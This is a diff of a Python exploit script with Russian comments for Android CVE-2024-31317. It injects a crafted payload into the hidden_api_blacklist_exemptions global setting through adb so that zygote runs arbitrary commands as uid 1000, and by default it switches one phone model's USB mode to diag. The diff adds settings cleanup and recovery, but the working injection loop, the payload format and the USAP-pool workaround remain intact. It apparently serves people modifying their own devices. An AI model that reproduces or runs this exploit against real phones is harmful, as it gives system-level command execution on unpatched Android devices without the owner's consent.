@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# Modified 2026-10-17: owned cleanup receipt and finally for temporary settings.
 """Исполнение произвольной команды от uid=1000 через CVE-2024-31317.
 
 CVE-2024-31317 — инъекция аргументов в zygote через глобальную настройку
@@ -7,7 +8,7 @@ hidden_api_blacklist_exemptions. Работает от adb shell (uid 2000):
 
 Без аргументов -- проверенное действие: переключение USB-композиции
 телефона в diag,modem,adb (A101BM 1.280PO.0686.a, SPL 2022-10-01).
-На прошивках с патчем 2024-05 работать НЕ будет.
+Исправление включено в SPL 2024-06-01; старый SPL не доказывает отсутствие backport.
 
 Режимы:
   (без аргументов)      переключить USB в diag,modem,adb (как раньше)
@@ -29,9 +30,9 @@ hidden_api_blacklist_exemptions. Работает от adb shell (uid 2000):
     выдаёт --encode: подставьте его фрагмент внутрь --cmd.
   - ДВОЙНОЙ бэкслеш в python-строке: '\\\\x64' -> в payload '\\x64' -> printf 'd'
 
-USAP: если инъекции молча не срабатывают, отключить USAP-пул:
-  adb shell device_config put activity_manager native_usap_pool_enabled false
-  затем несколько раз пересоздать приложение (скрипт делает это сам).
+Скрипт временно отключает USAP-пул и пересоздаёт приложение при попытках.
+Исходные настройки сохраняются в журнале; после работы проверяется очистка.
+При незавершённой очистке используйте --cleanup или общий --recover.
 """
 from __future__ import annotations
 
@@ -40,6 +41,8 @@ import subprocess
 import sys
 import time
 from pathlib import Path
+
+from cve_cleanup import DEFAULT_STATE, CleanupError, InjectionCleanup, cleanup_pending
 
 # 3000 "\\n" + 5157 "A" + ядро + "," + 1400 "\\n," — проверенный формат (oddbyte)
 PREFIX = "\n" * 3000 + "A" * 5157
@@ -131,13 +134,29 @@ def main():
                          "MARK выбирайте уникальным на этот запуск")
     ap.add_argument("--encode", metavar="STRING",
                     help="конвертер строка -> printf-экранирование, печатает и выходит")
+    ap.add_argument("--cleanup", action="store_true", help="восстановить настройки из локального журнала, без инъекции")
     a = ap.parse_args()
+
+    if a.cleanup:
+        if a.cmd or a.encode is not None:
+            ap.error("--cleanup нельзя совмещать с --cmd/--encode")
+        try:
+            cleaned = cleanup_pending(adb_exe=a.adb)
+        except (CleanupError, OSError, ValueError) as error:
+            print(f"CLEANUP PENDING: {error}", file=sys.stderr)
+            return 1
+        print("CLEANUP OK" if cleaned else "Нет ожидающей очистки.")
+        return 0
 
     if a.encode is not None:
         encode_and_print(a.encode)
         return 0
     if a.log_tag and not a.cmd:
         ap.error("--log-tag применим только вместе с --cmd")
+    if DEFAULT_STATE.exists():
+        print("Предыдущая очистка CVE не завершена. Используйте --cleanup "
+              "или общий сценарий --recover.", file=sys.stderr)
+        return 2
 
     adb = [a.adb]
 
@@ -197,8 +216,8 @@ def main():
         print("Ошибка: телефон не загрузился/не виден в adb", file=sys.stderr)
         return 1
 
-    # baseline: критерий, выполненный ДО инъекций, -- ложноположительный
-    # оракул (например, свойство уже имеет нужное значение); честно отказываемся
+    # Критерий, выполненный до инъекций (например, уже заданное свойство),
+    # не подтверждает успех этой попытки и должен приводить к отказу.
     ok0, status0 = check()
     if ok0:
         if not a.cmd:
@@ -211,50 +230,54 @@ def main():
               "маркером в выводе команды).", file=sys.stderr)
         return 1
 
-    print("[2/5] отключаем USAP-пул (лечит 'молчаливые' отказы инъекции)...")
-    sh(adb, "device_config put activity_manager native_usap_pool_enabled false")
+    with InjectionCleanup(a.adb) as injection:
+        adb = [a.adb, "-s", injection.serial]
+        print("[2/5] отключаем USAP-пул (лечит 'молчаливые' отказы инъекции)...")
+        sh(adb, "device_config put activity_manager native_usap_pool_enabled false")
 
-    print("[3/5] собираю payload...")
-    p = Path("p31317.txt")
-    p.write_text(payload, encoding="utf-8", newline="\n")
-    print(f"      payload: {len(payload)} байт -> {p}")
+        print("[3/5] Подготовка payload...")
+        p = Path("p31317.txt")
+        p.write_text(payload, encoding="utf-8", newline="\n")
+        print(f"      payload: {len(payload)} байт -> {p}")
 
-    print("[4/5] push payload...")
-    r = subprocess.run(adb + ["push", str(p), "/data/local/tmp/p31317.txt"],
-                       capture_output=True, text=True)
-    if r.returncode != 0:
-        print("push не удался:", r.stderr, file=sys.stderr)
-        return 1
+        print("[4/5] push payload...")
+        r = subprocess.run(adb + ["push", str(p), "/data/local/tmp/p31317.txt"],
+                           capture_output=True, text=True, timeout=30)
+        if r.returncode != 0:
+            print("push не удался:", r.stderr, file=sys.stderr)
+            return 1
 
-    print("[5/5] инъекции (вероятностные)...")
-    for i in range(1, a.attempts + 1):
-        sh(adb, "am force-stop com.android.settings 2>/dev/null")
-        sh(adb, 'P="$(cat /data/local/tmp/p31317.txt)"'
-                ' && settings put global hidden_api_blacklist_exemptions "$P"'
-                ' && settings put global hidden_api_blacklist_exemptions "*"')
-        sh(adb, "am start -n com.android.settings/.Settings >/dev/null 2>&1")
-        time.sleep(3)
-        sh(adb, "settings delete global hidden_api_blacklist_exemptions >/dev/null 2>&1")
-        ok, status = check()
-        print(f"  попытка {i}: {status}")
-        if ok:
-            print("ГОТОВО: команда выполнена (критерий выполнен).")
-            if not a.cmd:
-                print("Диаг-композиция активна, USB переенумерировался.")
-                print("Windows: подождите установку драйвера; Linux: lsusb должен")
-                print("показать 0482:0a9d. Далее см. guide/03 или 04.")
-            elif a.log_tag:
-                print(f"Вывод команды: adb logcat -s {a.log_tag}")
+        print("[5/5] инъекции (вероятностные)...")
+        for i in range(1, a.attempts + 1):
+            sh(adb, "am force-stop com.android.settings 2>/dev/null")
+            try:
+                sh(adb, 'P="$(cat /data/local/tmp/p31317.txt)"'
+                        ' && settings put global hidden_api_blacklist_exemptions "$P"'
+                        ' && settings put global hidden_api_blacklist_exemptions "*"')
+                sh(adb, "am start -n com.android.settings/.Settings >/dev/null 2>&1")
+                time.sleep(3)
+            finally:
+                sh(adb, "settings delete global hidden_api_blacklist_exemptions >/dev/null 2>&1")
+            ok, status = check()
+            print(f"  попытка {i}: {status}")
+            if ok:
+                print("ГОТОВО: команда выполнена (критерий выполнен).")
+                if not a.cmd:
+                    print("Диаг-композиция активна, USB переенумерировался.")
+                    print("Windows: подождите установку драйвера; Linux: lsusb должен")
+                    print("показать 0482:0a9d. Далее см. README.md#diagnostics.")
+                elif a.log_tag:
+                    print(f"Вывод команды: adb logcat -s {a.log_tag}")
+                return 0
+
+        if a.cmd and not (a.check_prop or a.check_file or a.check_log):
+            print("Попытки исчерпаны; критерий успеха не задан — проверьте эффект")
+            print("вручную (например, adb logcat -s TAG или состояние устройства).")
             return 0
-
-    if a.cmd and not (a.check_prop or a.check_file or a.check_log):
-        print("Попытки исчерпаны; критерий успеха не задан — проверьте эффект")
-        print("вручную (например, adb logcat -s TAG или состояние устройства).")
-        return 0
-    print("Не удалось за отведённое число попыток. Перезагрузите телефон",
-          "и повторите (после ребута USAP-пул пуст — первые попытки легче).",
-          file=sys.stderr)
-    return 1
+        print("Не удалось за отведённое число попыток. Перезагрузите телефон",
+              "и повторите (после ребута USAP-пул пуст — первые попытки легче).",
+              file=sys.stderr)
+        return 1
 
 
 if __name__ == "__main__":
